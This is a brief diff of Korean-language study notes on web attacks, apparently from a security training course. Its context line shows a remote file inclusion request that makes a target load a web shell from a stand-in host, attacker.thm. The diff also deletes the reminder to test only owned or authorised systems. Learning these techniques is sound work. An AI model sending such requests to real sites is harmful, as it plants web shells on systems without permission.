@@ -43,4 +43,3 @@ curl "http://target/index.php?lang=http://attacker.thm/webshell.php"
 
 - SSRF(네트워크 레벨 요청)와는 다른 문제다. 둘 다 웹 공격 단계에 나온다.
 - 발견한 파라미터와 payload는 노트(05-progress-tracker)에 기록한다.
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
